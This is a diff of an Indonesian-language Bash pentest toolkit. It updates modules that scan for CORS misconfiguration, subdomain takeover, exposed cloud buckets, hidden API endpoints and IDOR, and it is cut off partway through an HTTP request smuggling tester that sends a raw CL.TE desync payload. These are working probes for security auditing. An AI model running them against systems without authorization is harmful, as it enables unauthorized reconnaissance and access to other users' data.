+        echo "DATE : $(date)"
+        echo "---------------------------------------------------------------------------"
+        printf "%-30s | %-15s | %-15s\n" "ORIGIN TESTED" "ALLOW-ORIGIN" "ALLOW-CREDS"
+        echo "---------------------------------------------------------------------------"
     } > "$filename"
 
-    # Request dengan Header Origin kustom
-    cors_res=$(curl -s -I -k -A "$ua" -H "Origin: $attacker_origin" --connect-timeout 10 "$target")
+    for evil_origin in "${origins[@]}"; do
+        # Progress Bar
+        percent=$(( current * 100 / total ))
+        bar_len=$(( percent / 5 ))
+        bar=$(printf "%${bar_len}s" | tr ' ' '=')
+        printf "\r${INFO} Progress: [${P}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"
 
-    allow_origin=$(echo "$cors_res" | grep -i "Access-Control-Allow-Origin" | awk '{print $2}' | tr -d '\r')
-    allow_creds=$(echo "$cors_res" | grep -i "Access-Control-Allow-Credentials" | awk '{print $2}' | tr -d '\r')
+        # Request
+        cors_res=$(curl -s -I -k -A "$ua" -H "Origin: $evil_origin" --connect-timeout 10 "$target")
+        
+        allow_origin=$(echo "$cors_res" | grep -i "Access-Control-Allow-Origin" | awk '{print $2}' | tr -d '\r')
+        allow_creds=$(echo "$cors_res" | grep -i "Access-Control-Allow-Credentials" | awk '{print $2}' | tr -d '\r')
 
-    # Evaluasi Hasil
-    status_final="SECURE"
-    color_res="${G}"
-
-    if [[ "$allow_origin" == "$attacker_origin" ]]; then
-        status_final="VULNERABLE (REFLECTED)"
-        color_res="${Y}"
-        if [[ "$allow_creds" == *"true"* ]]; then
-            status_final="CRITICAL (REFLECTED + CREDS)"
-            color_res="${R}${BLINK}"
+        # Analisis Kerentanan
+        if [[ "$allow_origin" == "$evil_origin" || "$allow_origin" == "*" ]]; then
+            status_tag="${Y}VULN"
+            if [[ "$allow_creds" == *"true"* ]]; then
+                status_tag="${R}${BLINK}CRITICAL"
+            fi
+            echo -e "\n  ${OK} ${status_tag}${NC}: Origin ${W}$evil_origin${NC} diterima!"
+            ((found_vuln++))
         fi
-    elif [[ "$allow_origin" == "*" ]]; then
-        status_final="RISKY (WILDCARD)"
-        color_res="${Y}"
+
+        printf "%-30s | %-15s | %-15s\n" "$evil_origin" "${allow_origin:-None}" "${allow_creds:-None}" >> "$filename"
+        ((current++))
+    done
+
+    echo -ne "\r                                                                             \r"
+    echo -e "-----------------------------------------------------------------------------"
+    if [ $found_vuln -gt 0 ]; then
+        echo -e "${ERR} ${R}${BOLD}[!] ALERT:${NC} Terdeteksi celah CORS Misconfiguration!"
+    else
+        echo -e "${OK} ${G}Scan Selesai. Kebijakan CORS tampak aman.${NC}"
     fi
-
-    echo -e "  ${OK} ACAO Header: ${W}${allow_origin:-NOT FOUND}${NC}"
-    echo -e "  ${OK} ACAC Header: ${W}${allow_creds:-NOT FOUND}${NC}"
-    echo -e "  ${OK} Status Audit: ${color_res}$status_final${NC}"
-
-    # Tulis ke Log
-    printf "%-35s | %-25s\n" "Access-Control-Allow-Origin" "${allow_origin:-None}" >> "$filename"
-    printf "%-35s | %-25s\n" "Access-Control-Allow-Credentials" "${allow_creds:-None}" >> "$filename"
-    printf "%-35s | %-25s\n" "OVERALL STATUS" "$status_final" >> "$filename"
-
-    echo "-----------------------------------------------------" >> "$filename"
-    echo -e "\n${INFO} Hasil audit CORS tersimpan di: ${DG}$filename"
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
 }
 function start_takeover_hunter {
     clear
-    local nama_modul="TAKEOVER HUNTER"
+    local nama_modul="TAKEOVER HUNTER PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "                 MODUL 13: SUBDOMAIN TAKEOVER HUNTER                         "
-    echo -e "=============================================================================${NC}"
-    echo -e "${INFO} Menganalisis CNAME Record yang mengarah ke layanan pihak ketiga mati."
+    echo -e "                ${W}${BOLD}MODUL 13: SUBDOMAIN TAKEOVER HUNTER PRO${NC}                "
+    echo -e "${C}=============================================================================${NC}"
+    echo -e "${INFO} Mendeteksi CNAME ke layanan pihak ketiga yang tidak terkonfigurasi."
     echo "-----------------------------------------------------------------------------"
 
-    echo -ne "${Q} Masukkan Subdomain Target (contoh: dev.site.com): ${W}"
-    read target
-
-    if [[ -z "$target" ]]; then
-        echo -e "${ERR} Target tidak boleh kosong!"; return
-    fi
+    echo -ne "${Q} Masukkan Subdomain Target (cth: blog.site.com): ${W}"; read target
+    [[ -z "$target" ]] && return
 
     local target_clean=$(echo "$target" | sed 's/[^a-zA-Z0-9.-]/_/g')
-    local filename="${target_clean^^}_TAKEOVER_AUDIT.txt"
+    local filename="${target_clean^^}_TAKEOVER_PRO.txt"
 
-    echo -e "\n${INFO} Menganalisis DNS Record untuk: ${W}$target"
+    echo -e "\n${INFO} Menganalisis DNS & Response untuk: ${W}$target"
     echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
-    {
-        echo "====================================================="
-        echo "          SUBDOMAIN TAKEOVER AUDIT REPORT            "
-        echo "====================================================="
-        echo "TARGET : $target"
-        echo "DATE   : $(date)"
-        echo "-----------------------------------------------------"
-        printf "%-20s | %-35s\n" "DNS TYPE" "VALUE / ALIAS"
-        echo "-----------------------------------------------------"
-    } > "$filename"
-
-    # Ambil CNAME menggunakan host
+    # 1. Cek DNS Record
     cname=$(host -t CNAME "$target" | awk '/is an alias for/ {print $NF}' | sed 's/\.$//')
 
+    {
+        echo "SUBDOMAIN TAKEOVER PRO REPORT"
+        echo "TARGET : $target"
+        echo "DATE   : $(date)"
+        echo "---------------------------------------------------------------------------"
+    } > "$filename"
+
     if [[ -z "$cname" ]]; then
-        echo -e "  ${OK} Status: ${G}AMAN${NC} (Tidak ditemukan CNAME record)."
-        printf "%-20s | %-35s\n" "CNAME" "NOT FOUND" >> "$filename"
+        echo -e "  ${INFO} DNS Status: ${G}No CNAME detected.${NC}"
+        echo "STATUS: No CNAME Record Found." >> "$filename"
     else
-        echo -e "  ${OK} CNAME Terdeteksi: ${Y}$cname${NC}"
-        printf "%-20s | %-35s\n" "CNAME" "$cname" >> "$filename"
-        
-        # Database Fingerprint Layanan Rentan
+        echo -e "  ${OK} CNAME Alias: ${Y}$cname${NC}"
+        echo "CNAME ALIAS: $cname" >> "$filename"
+
+        # 2. Fingerprint Matching
         fingerprints=(
-            "GitHub Pages|github.io"
-            "Heroku|herokudns.com"
-            "Amazon S3|amazonaws.com"
-            "Shopify|myshopify.com"
-            "Squarespace|squarespace.com"
-            "Azure|azurewebsites.net"
+            "GitHub|github.io" "Heroku|herokudns.com" "AmazonS3|amazonaws.com"
+            "Shopify|myshopify.com" "Azure|azurewebsites.net" "Desk|desk.com"
         )
 
-        found_match=false
-        for entry in "${fingerprints[@]}"; do
-            service=$(echo $entry | cut -d'|' -f1)
-            pattern=$(echo $entry | cut -d'|' -f2)
+        found_fp=false
+        for fp in "${fingerprints[@]}"; do
+            service=$(echo $fp | cut -d'|' -f1)
+            pattern=$(echo $fp | cut -d'|' -f2)
 
             if [[ "$cname" == *"$pattern"* ]]; then
-                echo -e "  ${ERR} ${R}${BLINK}POTENSI TAKEOVER:${NC} Mengarah ke ${W}$service${NC}"
-                echo "-----------------------------------------------------" >> "$filename"
-                echo "STATUS: VULNERABLE TO TAKEOVER ($service)" >> "$filename"
-                found_match=true
+                echo -e "  ${OK} Service: ${C}$service${NC}"
+                found_fp=true
+                
+                # 3. Verifikasi HTTP Status (Double Check)
+                echo -ne "  ${INFO} Verifying service availability... "
+                http_code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "http://$target")
+                
+                if [[ "$http_code" == "404" ]]; then
+                    echo -e "${R}${BLINK}VULNERABLE (404 Not Found)${NC}"
+                    echo "RESULT: VULNERABLE - Service $service returns 404" >> "$filename"
+                else
+                    echo -e "${G}POTENTIALLY SAFE (HTTP $http_code)${NC}"
+                    echo "RESULT: POTENTIAL - Fingerprint match but HTTP is $http_code" >> "$filename"
+                fi
                 break
             fi
         done
 
-        if [ "$found_match" = false ]; then
-            echo -e "  ${INFO} Status: ${C}CNAME UNKNOWN${NC} (Bukan fingerprint umum)."
+        if [ "$found_fp" = false ]; then
+            echo -e "  ${INFO} Service: ${W}Unknown/Custom${NC}"
+            echo "RESULT: CNAME points to unknown provider." >> "$filename"
         fi
     fi
 
-    echo -e "\n-----------------------------------------------------------------------------"
-    echo -e "${INFO} Laporan audit DNS tersimpan di: ${DG}$filename"
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    echo -e "-----------------------------------------------------------------------------"
+    echo -e "${INFO} Audit Selesai. Hasil: ${DG}$filename${NC}"
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
 }
+
 function start_bucket_hunter {
     clear
-    local nama_modul="BUCKET HUNTER"
+    local nama_modul="BUCKET HUNTER PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "                 MODUL 14: CLOUD BUCKET (S3/GCP) EXPOSURE FINDER             "
-    echo -e "=============================================================================${NC}"
-    echo -e "${INFO} Mencari storage AWS S3 atau Google Cloud yang terbuka secara publik."
+    echo -e "                ${W}${BOLD}MODUL 14: CLOUD STORAGE EXPOSURE FINDER PRO${NC}                "
+    echo -e "${C}=============================================================================${NC}"
+    echo -e "${INFO} Mencari storage AWS S3, GCP, & Azure yang terbuka secara publik."
     echo "-----------------------------------------------------------------------------"
 
-    echo -ne "${Q} Masukkan Nama Bucket/Projek: ${W}"
-    read bucket_name
+    echo -ne "${Q} Masukkan Nama Bucket/Projek: ${W}"; read bucket_name
+    [[ -z "$bucket_name" ]] && return
 
-    if [[ -z "$bucket_name" ]]; then
-        echo -e "${ERR} Nama bucket tidak boleh kosong!"; return
-    fi
+    local filename="$(echo "$bucket_name" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_BUCKET_PRO.txt"
 
-    local filename="${bucket_name^^}_BUCKET_AUDIT.txt"
+    # Cloud Endpoints
+    providers=(
+        "AWS S3|http://$bucket_name.s3.amazonaws.com"
+        "GCP Storage|https://storage.googleapis.com/$bucket_name"
+        "Azure Blob|https://$bucket_name.blob.core.windows.net"
+    )
 
-    echo -e "\n${INFO} Memulai imbasan pada: ${W}$bucket_name"
+    total=${#providers[@]}
+    current=1
+    found_exposed=0
+
+    echo -e "\n${INFO} Scanning Bucket: ${W}$bucket_name"
     echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     {
-        echo "====================================================="
-        echo "          CLOUD BUCKET EXPOSURE REPORT               "
-        echo "====================================================="
+        echo "CLOUD BUCKET PRO AUDIT REPORT"
         echo "BUCKET NAME : $bucket_name"
         echo "DATE        : $(date)"
-        echo "-----------------------------------------------------"
-        printf "%-15s | %-12s | %-20s\n" "CLOUD PROVIDER" "HTTP CODE" "STATUS"
-        echo "-----------------------------------------------------"
+        echo "---------------------------------------------------------------------------"
+        printf "%-15s | %-10s | %-20s\n" "PROVIDER" "CODE" "SECURITY STATUS"
+        echo "---------------------------------------------------------------------------"
     } > "$filename"
 
-    # --- 1. AWS S3 ---
-    s3_url="http://$bucket_name.s3.amazonaws.com"
-    s3_res=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$s3_url")
-    
-    if [[ "$s3_res" == "200" ]]; then
-        s3_stat="VULNERABLE (OPEN)"
-        echo -e "  ${ERR} AWS S3  : ${R}${BOLD}OPEN / EXPOSED${NC}"
-    elif [[ "$s3_res" == "403" ]]; then
-        s3_stat="SECURE (PRIVATE)"
-        echo -e "  ${OK} AWS S3  : ${G}PRIVATE${NC}"
+    for entry in "${providers[@]}"; do
+        provider=$(echo "$entry" | cut -d'|' -f1)
+        url=$(echo "$entry" | cut -d'|' -f2)
+
+        # Progress Bar
+        percent=$(( current * 100 / total ))
+        bar_len=$(( percent / 5 ))
+        bar=$(printf "%${bar_len}s" | tr ' ' '=')
+        printf "\r${INFO} Progress: [${P}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"
+
+        # Request & Content Check
+        res_body=$(curl -s -k --connect-timeout 5 "$url")
+        http_code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$url")
+
+        status_msg="SECURE/PRIVATE"
+        color_status="${G}"
+
+        if [[ "$http_code" == "200" ]]; then
+            # Cek jika ada list file (XML common in S3/GCP)
+            if [[ "$res_body" == *"<Key>"* || "$res_body" == *"<Contents>"* || "$res_body" == *"ListBucketResult"* ]]; then
+                status_msg="VULNERABLE (LISTABLE)"
+                color_status="${R}${BLINK}"
+                ((found_exposed++))
+            else
+                status_msg="OPEN (EMPTY/INDEX)"
+                color_status="${Y}"
+                ((found_exposed++))
+            fi
+        elif [[ "$http_code" == "403" ]]; then
+            status_msg="PROTECTED (403)"
+        else
+            status_msg="NOT FOUND / ERROR"
+            color_status="${DG}"
+        fi
+
+        echo -e "\n  ${OK} ${provider}: ${color_status}${status_msg}${NC}"
+        printf "%-15s | %-10s | %-20s\n" "$provider" "$http_code" "$status_msg" >> "$filename"
+        
+        ((current++))
+    done
+
+    echo -ne "\r                                                                             \r"
+    echo -e "-----------------------------------------------------------------------------"
+    if [ $found_exposed -gt 0 ]; then
+        echo -e "${ERR} ${R}${BOLD}[!] ALERT:${NC} Terdeteksi exposure pada cloud storage!"
     else
-        s3_stat="NOT FOUND"
-        echo -e "  ${INFO} AWS S3  : ${DG}NOT FOUND ($s3_res)${NC}"
+        echo -e "${OK} ${G}Scan Selesai. Tidak ditemukan bucket publik.${NC}"
     fi
-    printf "%-15s | %-12s | %-20s\n" "Amazon S3" "$s3_res" "$s3_stat" >> "$filename"
-
-    # --- 2. GCP ---
-    gcp_url="https://storage.googleapis.com/$bucket_name"
-    gcp_res=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$gcp_url")
-
-    if [[ "$gcp_res" == "200" ]]; then
-        gcp_stat="VULNERABLE (OPEN)"
-        echo -e "  ${ERR} GCP     : ${R}${BOLD}OPEN / EXPOSED${NC}"
-    elif [[ "$gcp_res" == "403" ]]; then
-        gcp_stat="SECURE (PRIVATE)"
-        echo -e "  ${OK} GCP     : ${G}PRIVATE${NC}"
-    else
-        gcp_stat="NOT FOUND"
-        echo -e "  ${INFO} GCP     : ${DG}NOT FOUND ($gcp_res)${NC}"
-    fi
-    printf "%-15s | %-12s | %-20s\n" "Google GCP" "$gcp_res" "$gcp_stat" >> "$filename"
-
-    echo -e "\n-----------------------------------------------------------------------------"
-    echo "-----------------------------------------------------" >> "$filename"
-    echo -e "${OK} Hasil audit bucket tersimpan di: ${DG}$filename"
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
 }
+
 function start_api_discovery {
     clear
-    local nama_modul="API DISCOVERY"
+    local nama_modul="API DISCOVERY PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "                  MODUL 15: API ENDPOINT DISCOVERY (REST/GRAPHQL)            "
-    echo -e "=============================================================================${NC}"
-    echo -e "${INFO} Mencari jalur API tersembunyi, dokumentasi Swagger, atau GraphQL."
+    echo -e "                ${W}${BOLD}MODUL 15: API ENDPOINT DISCOVERY PRO${NC}                "
+    echo -e "${C}=============================================================================${NC}"
+    echo -e "${INFO} Fuzzing jalur API, dokumentasi Swagger, & GraphQL Introspection."
     echo "-----------------------------------------------------------------------------"
 
-    echo -ne "${Q} Masukkan URL Target (contoh: http://api.site.com/): ${W}"
-    read target
+    echo -ne "${Q} Masukkan URL Target (cth: http://api.site.com): ${W}"; read target
+    [[ -z "$target" ]] && return
     [[ "${target: -1}" != "/" ]] && target="$target/"
-
-    if [[ -z "$target" ]]; then
-        echo -e "${ERR} URL tidak boleh kosong!"; return
-    fi
 
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
-    local filename="${domain_clean^^}_API_DISCOVERY.txt"
+    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_API_PRO.txt"
 
-    api_paths=("api/v1" "api/v2" "graphql" "swagger-ui.html" "api-docs" "v1/swagger.json" "api/v1/user" "api/v1/auth" "api/v1/console" "graphiql")
+    # Expanded API Path List
+    api_paths=(
+        "api/v1" "api/v2" "api/v3" "graphql" "graphiql" "swagger/index.html" 
+        "swagger-ui.html" "api-docs" "v1/swagger.json" "swagger.yaml" 
+        "api/v1/health" "api/v1/auth/login" "console" "actuator/health" "api/docs"
+    )
 
-    echo -e "\n${INFO} Memindai API pada: ${W}$target"
+    total=${#api_paths[@]}
+    current=1
+    found_api=0
+    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    echo -e "\n${INFO} Fuzzing API Endpoints pada: ${W}$target"
     echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     {
-        echo "====================================================="
-        echo "          API ENDPOINT DISCOVERY REPORT              "
-        echo "====================================================="
-        echo "TARGET : $target"
-        printf "%-25s | %-12s | %-20s\n" "ENDPOINT PATH" "HTTP CODE" "STATUS"
-        echo "-----------------------------------------------------"
+        echo "API DISCOVERY PRO REPORT - $target"
+        echo "DATE : $(date)"
+        echo "---------------------------------------------------------------------------"
+        printf "%-30s | %-10s | %-20s\n" "ENDPOINT" "CODE" "DETECTION"
+        echo "---------------------------------------------------------------------------"
     } > "$filename"
 
-    found_api=0
     for path in "${api_paths[@]}"; do
-        echo -ne "  ${INFO} Scanning: ${C}/$path ${NC}\r"
-        status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" --connect-timeout 5 "$target$path")
+        # Progress Bar
+        percent=$(( current * 100 / total ))
+        bar_len=$(( percent / 5 ))
+        bar=$(printf "%${bar_len}s" | tr ' ' '=')
+        printf "\r${INFO} Progress: [${P}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"
 
-        if [[ "$status_code" == "200" || "$status_code" == "401" || "$status_code" == "403" ]]; then
-            res_status="FOUND"
-            color_api="${G}"
-            [[ "$status_code" == "401" ]] && { res_status="AUTH REQUIRED"; color_api="${Y}"; }
-            [[ "$status_code" == "403" ]] && { res_status="FORBIDDEN"; color_api="${Y}"; }
-            
-            echo -e "  ${OK} ${W}/$path ${NC}-> ${color_api}$status_code${NC} (${DG}$res_status${NC})"
-            printf "%-25s | %-12s | %-20s\n" "/$path" "$status_code" "$res_status" >> "$filename"
+        # Full Request for Content Analysis
+        res_full=$(curl -s -k -L -A "$ua" --connect-timeout 5 "$target$path")
+        http_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" --connect-timeout 5 "$target$path")
+
+        if [[ "$http_code" == "200" || "$http_code" == "401" || "$http_code" == "403" ]]; then
+            # Deteksi Tipe API
+            api_type="REST Endpoint"
+            if [[ "$res_full" == *"swagger"* || "$res_full" == *"openapi"* ]]; then api_type="Swagger/Docs"; fi
+            if [[ "$res_full" == *"graphql"* || "$res_full" == *"IntrospectionQuery"* ]]; then api_type="GraphQL/Query"; fi
+            if [[ "$http_code" == "401" ]]; then api_type="Protected API"; fi
+
+            echo -e "\n  ${OK} ${W}/$path ${NC}-> ${G}$http_code${NC} (${C}$api_type${NC})"
+            printf "%-30s | %-10s | %-20s\n" "/$path" "$http_code" "$api_type" >> "$filename"
             ((found_api++))
         fi
-        sleep 0.05
+        
+        ((current++))
     done
 
-    echo -ne "                                                                                \r"
-    echo "-----------------------------------------------------" >> "$filename"
-    echo -e "${OK} Scan selesai. Ditemukan ${G}$found_api${NC} endpoint potensial."
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    echo -ne "\r                                                                             \r"
+    echo -e "-----------------------------------------------------------------------------"
+    if [ $found_api -gt 0 ]; then
+        echo -e "${OK} Scan Selesai. Ditemukan ${G}$found_api${NC} endpoint API potensial."
+    else
+        echo -e "${INFO} Scan Selesai. Tidak ada endpoint API publik yang ditemukan."
+    fi
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
 }
+
 function start_idor_tester {
     clear
-    local nama_modul="IDOR TESTER"
+    local nama_modul="IDOR TESTER PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "              MODUL 16: BROKEN ACCESS CONTROL (IDOR) - TURBO                 "
-    echo -e "=============================================================================${NC}"
+    echo -e "                ${W}${BOLD}MODUL 16: BROKEN ACCESS CONTROL (IDOR) PRO${NC}                "
+    echo -e "${C}=============================================================================${NC}"
+    echo -e "${INFO} Menguji otorisasi dengan memanipulasi parameter ID secara masif."
+    echo "-----------------------------------------------------------------------------"
 
-    echo -ne "${Q} Masukkan URL dengan ID (contoh: http://site.com/api/user?id=100): ${W}"
-    read target
-
+    echo -ne "${Q} Masukkan URL dengan ID (cth: http://site.com/api/user?id=100): ${W}"; read target
     if [[ -z "$target" || "$target" != *"="* ]]; then
         echo -e "${ERR} URL harus menyertakan parameter ID!"; return
     fi
 
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
-    local filename="${domain_clean^^}_IDOR_AUDIT.txt"
+    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_IDOR_PRO.txt"
     
     base_url="${target%=*}="
     original_id="${target#*=}"
 
     echo -e "${INFO} Mengambil baseline respon untuk ID asli (${C}$original_id${NC})..."
     baseline_res=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -k "$target")
+    baseline_code=$(echo $baseline_res | cut -d':' -f1)
     baseline_size=$(echo $baseline_res | cut -d':' -f2)
-    echo -e "${INFO} Baseline Size: ${W}$baseline_size bytes${NC}"
+    
+    echo -e "${INFO} Baseline: Code ${W}$baseline_code${NC}, Size ${W}$baseline_size bytes${NC}"
+    echo -e "${INFO} Log File: ${DG}$filename${NC}"
+    echo "-----------------------------------------------------------------------------"
+
+    {
+        echo "IDOR PRO AUDIT REPORT - $target"
+        echo "DATE : $(date)"
+        echo "---------------------------------------------------------------------------"
+        printf "%-10s | %-10s | %-12s | %-15s\n" "TEST ID" "HTTP CODE" "SIZE (BYTES)" "STATUS"
+        echo "---------------------------------------------------------------------------"
+    } > "$filename"
 
     # --- PENGATURAN MULTI-THREADING ---
-    local threads=10
+    local threads=15
     local temp_fifo="/tmp/idor_$$.fifo"
     mkfifo "$temp_fifo"
     exec 4<>"$temp_fifo"
     rm "$temp_fifo"
     for ((i=0; i<threads; i++)); do echo >&4; done
 
-    echo -e "\n${INFO} Memulai Fuzzing ID (Range: -20 s/d +50)..."
-    echo "-----------------------------------------------------------------------------"
+    local start_range=-20
+    local end_range=50
+    local total_tests=$((end_range - start_range))
+    local current=0
+    local found_idor=0
 
-    {
-        echo "====================================================="
-        echo "          IDOR VULNERABILITY AUDIT REPORT            "
-        echo "====================================================="
-        echo "TARGET BASE : $base_url"
-        echo "BASELINE    : $baseline_size bytes"
-        echo "DATE        : $(date)"
-        echo "-----------------------------------------------------"
-        printf "%-10s | %-12s | %-15s | %-15s\n" "TEST ID" "HTTP CODE" "SIZE (BYTES)" "RESULT"
-        echo "-----------------------------------------------------"
-    } > "$filename"
-
-    function check_idor {
-        local tid=$1; local b_url=$2; local b_size=$3; local log=$4
-        local res=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -k --connect-timeout 5 "${b_url}${tid}")
-        local code=$(echo $res | cut -d':' -f1); local size=$(echo $res | cut -d':' -f2)
-
-        if [[ "$code" == "200" ]]; then
-            local diff=$((size - b_size))
-            local abs_diff=${diff#-}
-            
-            # Jika ukuran berbeda dari baseline, ada kemungkinan data user lain bocor
-            if [ $abs_diff -gt 0 ]; then
-                echo -e "  ${OK} ID ${W}$tid ${NC}-> ${G}200 OK${NC} (${Y}Diff: $diff bytes${NC})"
-                printf "%-10s | %-12s | %-15s | %-15s\n" "$tid" "$code" "$size" "POTENSI IDOR" >> "$log"
-            fi
-        fi
-    }
-
-    for ((i=-20; i<=50; i++)); do
+    for ((i=start_range; i<=end_range; i++)); do
         [[ $i -eq 0 ]] && continue
         test_id=$((original_id + i))
         [[ $test_id -lt 0 ]] && continue
 
         read -u4
         (
-            check_idor "$test_id" "$base_url" "$baseline_size" "$filename"
+            res=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -k --connect-timeout 5 "${base_url}${test_id}")
+            code=$(echo $res | cut -d':' -f1)
+            size=$(echo $res | cut -d':' -f2)
+
+            if [[ "$code" == "200" ]]; then
+                diff=$((size - baseline_size))
+                abs_diff=${diff#-}
+                
+                # Jika size berbeda dari baseline, kemungkinan besar IDOR
+                if [ $abs_diff -gt 0 ]; then
+                    echo -e "\n  ${OK} ${R}${BLINK}POTENSI IDOR:${NC} ID ${W}$test_id${NC} (Size Diff: ${Y}$diff bytes${NC})"
+                    printf "%-10s | %-10s | %-12s | %-15s\n" "$test_id" "$code" "$size" "VULNERABLE" >> "$filename"
+                    echo "1" >> "/tmp/idor_found_$$"
+                fi
+            fi
             echo >&4
         ) &
+        
+        # Progress Bar Logic
+        ((current++))
+        percent=$(( current * 100 / total_tests ))
+        bar_len=$(( percent / 5 ))
+        bar=$(printf "%${bar_len}s" | tr ' ' '=')
+        printf "\r${INFO} Fuzzing: [${P}%-20s${NC}] %d%% (%d/%d)" "$bar" "$percent" "$current" "$total_tests"
     done
 
     wait
     exec 4>&-
+    
+    # Hitung temuan dari file temp
+    [[ -f "/tmp/idor_found_$$" ]] && found_idor=$(wc -l < "/tmp/idor_found_$$") && rm "/tmp/idor_found_$$"
 
+    echo -ne "\r                                                                             \r"
     echo -e "-----------------------------------------------------------------------------"
-    echo -e "${OK} Selesai! Temuan potensial dicatat di: ${DG}$filename"
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    if [ $found_idor -gt 0 ]; then
+        echo -e "${ERR} ${R}${BOLD}[!] ALERT:${NC} Terdeteksi $found_idor ID dengan respon tidak lazim!"
+    else
+        echo -e "${OK} ${G}Scan Selesai. Tidak ada anomali ID yang ditemukan.${NC}"
+    fi
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
 }
+
 function start_smuggling_tester {
     clear
-    local nama_modul="SMUGGLING TESTER"
+    local nama_modul="SMUGGLING TESTER PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "                  MODUL 17: HTTP REQUEST SMUGGLING (ADVANCED)                "
-    echo -e "=============================================================================${NC}"
+    echo -e "                ${W}${BOLD}MODUL 17: HTTP REQUEST SMUGGLING PRO${NC}                "
+    echo -e "${C}=============================================================================${NC}"
+    echo -e "${INFO} Menguji sinkronisasi antara Front-end (Proxy) dan Back-end server."
+    echo "-----------------------------------------------------------------------------"
 
-    echo -ne "${Q} Masukkan URL Target (contoh: http://target.com/): ${W}"
-    read target
-    if [[ -z "$target" ]]; then return; fi
+    echo -ne "${Q} Masukkan URL Target (cth: http://target.com): ${W}"; read target
+    [[ -z "$target" ]] && return
 
     local domain=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||')
     local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
-    local filename="${domain_clean^^}_SMUGGLING_AUDIT.txt"
+    local filename="${domain_clean^^}_SMUGGLING_PRO.txt"
 
-    echo -e "\n${INFO} Memeriksa Desinkronisasi HTTP pada: ${W}$domain"
+    echo -e "\n${INFO} Scanning Target: ${W}$domain"
+    echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     {
-        echo "====================================================="
-        echo "          HTTP REQUEST SMUGGLING AUDIT REPORT        "
-        echo "====================================================="
-        printf "%-15s | %-20s | %-15s\n" "TECHNIQUE" "DETECTION METHOD" "RESULT"
-        echo "-----------------------------------------------------"
+        echo "HTTP REQUEST SMUGGLING PRO REPORT"
+        echo "TARGET : $domain"
+        echo "DATE   : $(date)"
+        echo "---------------------------------------------------------------------------"
     } > "$filename"
 
-    # CL.TE Probe via Python (Raw Socket)
-    echo -ne "  ${INFO} Testing CL.TE Desync... \r"
-    result_clte=$(python3 -c "
-import socket
+    # --- TEKNIK 1: CL.TE ---
+    echo -ne "  ${INFO} Testing CL.TE (Content-Length / Transfer-Encoding)... "
+    res_clte=$(python3 -c "
+import socket, time
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.settimeout(7)
+s.settimeout(6)
 try:
+    start = time.time()
     s.connect(('$domain', 80))
     payload = 'POST / HTTP/1.1\r\nHost: $domain\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\n0\r\n\r\n'
     s.sendall(payload.encode())
     s.recv(1024)
     print('SECURE')
 except socket.timeout:
-    print('VULNERABLE (TIMEOUT)')
+    print('VULNERABLE')
 except:
     print('ERROR')
 " 2>/dev/null)
 
-    color_smug="${G}"
-    [[ "$result_clte" == *"VULNERABLE"* ]] && color_smug="${R}${BLINK}"
+    if [[ "$res_clte" == "VULNERABLE" ]]; then
+        echo -e "${R}${BLINK}VULNERABLE (Timeout Detected)${NC}"
+        echo "CL.TE: VULNERABLE - Backend server timed out waiting for data." >> "$filename"
+    else
+        echo -e "${G}SECURE${NC}"
+        echo "CL.TE: SECURE" >> "$filename"
+    fi
 
